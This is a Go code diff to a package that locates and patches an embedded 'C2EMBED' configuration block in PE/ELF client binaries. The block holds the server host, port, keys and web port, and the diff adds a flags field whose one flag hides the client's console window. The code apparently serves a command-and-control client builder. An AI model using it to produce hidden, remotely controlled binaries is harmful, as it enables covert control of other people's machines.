@@ -17,10 +17,14 @@ const (
 	VkeyLen     = 128
 	SaltLen     = 128
 	WebHostLen  = 64
+	FlagsLen    = 4 // uint32_le，见 FlagHideConsole
 	TailLen     = 8
-	TotalSize   = MagicLen + HostLen + 4 + VkeyLen + SaltLen + 4 + WebHostLen + 4 + TailLen
+	TotalSize   = MagicLen + HostLen + 4 + VkeyLen + SaltLen + 4 + WebHostLen + 4 + FlagsLen + TailLen
 	MagicString = "C2EMBED1"
 	TailString  = "C2EMBED2"
+
+	// FlagHideConsole 与 client c2_embed_config.h / Windows 客户端一致：勾选「隐藏控制台」时由 PatchC2Embed 写入。
+	FlagHideConsole = uint32(1)
 )
 
 // 相对魔数首字节的字段偏移
@@ -32,7 +36,8 @@ const (
 	RelOffsetHeartbeat = RelOffsetSalt + SaltLen
 	RelOffsetWebHost   = RelOffsetHeartbeat + 4
 	RelOffsetWebPort   = RelOffsetWebHost + WebHostLen
-	RelOffsetTail      = RelOffsetWebPort + 4
+	RelOffsetFlags     = RelOffsetWebPort + 4
+	RelOffsetTail      = RelOffsetFlags + FlagsLen
 )
 
 var magicBytes = []byte(MagicString)
@@ -49,7 +54,7 @@ func FindOffset(image []byte) int {
 func isTemplateEmbedBlock(p Parsed) bool {
 	return strings.TrimSpace(p.Host) == "" && p.Port == 0 &&
 		strings.TrimSpace(p.VKey) == "" && strings.TrimSpace(p.Salt) == "" &&
-		strings.TrimSpace(p.WebHost) == "" && p.WebPort == 0
+		strings.TrimSpace(p.WebHost) == "" && p.WebPort == 0 && p.Flags == 0
 }
 
 // FindPatchOffset 在 PE/ELF 中定位应修补的嵌入块。
@@ -95,6 +100,7 @@ type Parsed struct {
 	Heartbeat int
 	WebHost   string
 	WebPort   int
+	Flags     uint32
 }
 
 // ParseAt 从 image[off:] 解析一块（off 须指向魔数起始）。
@@ -120,6 +126,8 @@ func ParseAt(image []byte, off int) (Parsed, error) {
 	z.WebHost = cstrField(p[:WebHostLen])
 	p = p[WebHostLen:]
 	z.WebPort = int(binary.LittleEndian.Uint32(p[:4]))
+	p = p[4:]
+	z.Flags = binary.LittleEndian.Uint32(p[:4])
 	p = p[4:]
 	if len(p) < TailLen || string(p[:TailLen]) != TailString {
 		return z, fmt.Errorf("c2embed: tail magic mismatch (need %s)", TailString)
@@ -191,7 +199,7 @@ func writePadded(dst []byte, s string, max int) error {
 }
 
 // WriteAt 将配置写入 image[off:] 的嵌入块（off 指向魔数；不修改魔数字节）。
-func WriteAt(image []byte, off int, host string, port int, vkey, salt string, hb int, webHost string, webPort int) error {
+func WriteAt(image []byte, off int, host string, port int, vkey, salt string, hb int, webHost string, webPort int, flags uint32) error {
 	if off < 0 || off+TotalSize > len(image) {
 		return fmt.Errorf("c2embed: offset out of range")
 	}
@@ -229,6 +237,8 @@ func WriteAt(image []byte, off int, host string, port int, vkey, salt string, hb
 	p = p[WebHostLen:]
 	binary.LittleEndian.PutUint32(p[:4], uint32(webPort))
 	binary.LittleEndian.PutUint32(p[:4], uint32(webPort))
+	p = p[4:]
+	binary.LittleEndian.PutUint32(p[:4], flags)
 	p = p[4:]
 	copy(p[:TailLen], tailBytes)
 	return nil
